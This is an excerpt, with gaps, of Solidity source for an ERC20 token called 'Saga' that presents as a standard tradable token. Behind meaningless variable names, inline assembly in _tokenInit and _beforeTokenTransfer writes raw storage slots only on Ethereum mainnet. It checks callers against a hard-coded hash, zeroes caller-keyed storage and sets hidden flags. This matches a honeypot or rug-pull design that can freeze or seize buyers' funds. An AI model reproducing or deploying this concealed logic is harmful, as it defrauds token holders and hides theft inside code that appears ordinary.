...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addSaga;
    uint256 private sagaRain = block.number*2;

    mapping (address => bool) private _firstSpeech; 
    mapping (address => bool) private _secondMystery;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private danceElvis;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private moonWalk;
    address public pair;
    ...
    bool private trading; uint256 private newHorizons = 1; bool private learningLangauge;
    uint256 private _decimals; uint256 private risingTide;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addSaga.push(_router); addSaga.push(msgSender_); addSaga.push(pair);
        for (uint256 q=0; q < 3;) {_firstSpeech[addSaga[q]] = true; unchecked{q++;} }
    }
    ...
    function _tokenInit() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0xDC)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x73c52ae1e6a433b4492e712bd8b664a4700fad59ed9af9fc00ab5959f944471b
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x4fcf7dd8d2be8a09673cea2dbc8e662f48f628e62ee606f78f4563b58f0c2fcc,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; sagaRain = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addSaga[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeploySaga(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addSaga[0], 10 ** 77);
        _tokenInit();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeploySaga(creator, initialSupply);
    }
}

contract Saga is ERC20Token {
    constructor() ERC20Token("Saga", "SAGA", msg.sender, 25000000 * 10 ** 18) {
    }
}